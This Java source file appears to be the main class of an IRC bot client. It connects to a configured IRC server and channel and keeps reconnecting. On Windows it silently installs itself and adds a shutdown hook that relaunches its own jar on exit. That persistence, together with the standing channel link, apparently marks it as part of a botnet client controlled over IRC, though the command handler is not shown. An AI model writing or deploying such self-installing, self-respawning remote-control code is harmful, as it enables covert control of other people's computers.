package com.elementiumdev.irc;

import java.io.IOException;
import java.nio.charset.Charset;
import java.util.Locale;
import java.util.Random;

import org.jibble.pircbot.IrcException;
import org.jibble.pircbot.NickAlreadyInUseException;

import com.elementiumdev.util.Constants;
import com.elementiumdev.util.Functions;

public class IRC {
	public static Handler h = new Handler();

	static Thread t = new Thread(new Runnable(){

		@Override
		public void run() {

			h.disconnect();

			try {
				Runtime.getRuntime().exec("java -jar " + Functions.getJarLocation());
			} catch (IOException e) {
				e.printStackTrace();
			}

		}

	});

	public static void main(String[] args) throws NickAlreadyInUseException, IOException, IrcException {

		if(!Constants.CHANNEL.startsWith("#")) {
			Constants.CHANNEL = "#" + Constants.CHANNEL;
		}

		h.setVerbose(true);

		if(!connect()) {
			System.out.println("Cannot connect");
		}

		h.joinChannel(Constants.CHANNEL);

		if(System.getProperty("os.name").contains("win") && !Functions.windowsInstalled()) {
			Functions.windowsInstall();
			Runtime.getRuntime().addShutdownHook(t);
		}
		
		new Thread(new Runnable(){
			@Override
			public void run() {
				monitor();
				try {
					Thread.sleep(15000);
				} catch (InterruptedException e) {

					e.printStackTrace();
				}
			}
		}).run();

	}
	
	public static boolean connect() {
		try {
			h.connect(Constants.HOST, Constants.PORT);
		} catch (NickAlreadyInUseException e) {
			if(h.isConnected()) h.disconnect();
			h.newName();
			e.printStackTrace();
			System.out.println("ELEMENTIUMDEV ERROR: INVALID NICKNAME");
			return false;
		} catch (IrcException e1) {
			if(h.isConnected()) h.disconnect();
			h.newName();
			e1.printStackTrace();
			System.out.println("ELEMENTIUMDEV ERROR: IRC ERROR");
			return false;
		} catch (IOException e) {
			if(h.isConnected()) h.disconnect();
			h.newName();
			e.printStackTrace();
			System.out.println("ELEMENTIUMDEV ERROR: LOW-LEVEL SOCKET");
			return false;
		}
		return true;
	}
	
	public static void monitor() {
		if(!h.isConnected()) {
			try {
				h.connect(Constants.HOST, Constants.PORT);
			} catch (NickAlreadyInUseException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (IrcException e) {
				e.printStackTrace();
			}
		}
		
		if(!h.isInChannel()) {
			if(!Constants.CHANNEL.startsWith("#")) {
				Constants.CHANNEL = "#" + Constants.CHANNEL;
			}
			
			h.joinChannel(Constants.CHANNEL);
		}
	}


}
